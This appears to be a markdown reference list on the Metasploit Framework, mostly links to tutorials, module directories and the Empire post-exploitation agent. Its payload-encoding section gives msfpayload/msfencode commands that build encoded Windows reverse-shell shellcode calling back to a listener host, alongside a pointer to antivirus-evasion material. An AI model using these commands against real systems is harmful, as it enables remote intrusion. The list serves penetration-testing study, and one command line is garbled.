# Metasploit Framework

### General

* [What is Metasploit?](https://www.youtube.com/watch?v=TCPyoWHy4eA)

* [Metasploit - github.io](https://metasploit.github.io/Metasploit.md)

  * It is the official “reference” page for the metasploit framework

* [Facts and Myths about AV Evasion with the Metasploit Framework](http://schierlm.users.sourceforge.net/avevasion.html)

* [MSF/Meterpreter cmd reference](http://hacking-class.blogspot.com/2011/08/metasploit-cheat-sheet-metasploit.html)

* [Empire - Powershell Post-Exploitation Agent](http://www.powershellempire.com/)

  * Empire is a pure PowerShell post-exploitation agent built on
    cryptologically-secure communications and a flexible architecture. Empire
    implements the ability to run PowerShell agents without needing
    powershell.exe, rapidly deployable post-exploitation modules ranging from
    key loggers to Mimikatz, and adaptable communications to evade network
    detection, all wrapped up in a usability-focused framework.

* http://it-ovid.blogspot.com/2012/02/metasploit-and-meterpreter.html

### Metasploit Framework - Payload Encoding

* List all available payloads and search for windows reverse tcp

  * `shellsmsfpayload -l | grep windows | grep shell | grep reverse | tcp`

* List available encoders

  * `msfencode -l`

* Reverse self-contained (not staged) command shell: 341 bytes

  * `msfpayload windows/shell_reverse_tcp LHOST=192.168.6.1 R | msfencode -e
    x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c`

* Windows Command Shell, reverse Ordinal TCP Stager (Np NX or Win7)

  * Use msf multi/handler to listen and upload remainder of the shellcode (stage
    2)
  * `msfpayload windows/shell/reverse_ord_tcp LHOST=192.168.6.1 R | msfencode -e
    x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c`

* Generic Syntax

  * `msfpayload <payload> <options> <output>| ./msfencode -e <encoder> -b <bad
    bytes> -t <output format>`

### Contributing to Metasploit

* [Writing an Exploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit)
* [Writing an Exploit for Metasploit by Corelan](https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/Metasploit.md)
* [Writing an Auxiliary module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-auxiliary-module)
* [Writing a Post-Exploitation module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module)
* [Style tips for writing a Metasploit module](https://github.com/rapid7/metasploit-framework/wiki/Style-Tips)
* [Metasploit Framework Module Github](https://github.com/rapid7/metasploit-framework/tree/master/modules)

  * Easiest way of seeing the most current listing of any modules.
  * All are Github pages for the Metasploit project

* [Metasploit Framework Wiki](https://github.com/rapid7/metasploit-framework/wiki)
* [Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary)
* [Auxiliary Module Fuzzers](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/fuzzers)
* [Denial-of-Service Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/dos)
* [Auxiliary Gather Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/gather)
* [Auxiliary Scanner Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner)
* [Server Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/server)
* [Auxiliary Spoofing Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/spoof)
* [Auxiliary VOIP Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/voip)
* [Encoder Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/encoders)
* [Payloads - Singles](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles)
* [Payloads - Singles - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles/windows)
* [Payloads - Singles - Linux x86](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles/linux/x86)
* [Payloads - Stagers](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers)
* [Payloads - Stagers - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers/windows)
* [Payloads - Stagers - Linux x86](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers/linux/x86)
* [Exploits](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)
* [Exploits - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/windows)
* [Exploits - Linux](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux)
* [Exploits - Multi-Platform](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi)
* [Post-Exploitation Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post)
* [Post-Exploitation Windows Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post/windows)
* [Post-Exploitation Linux Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post/linux)
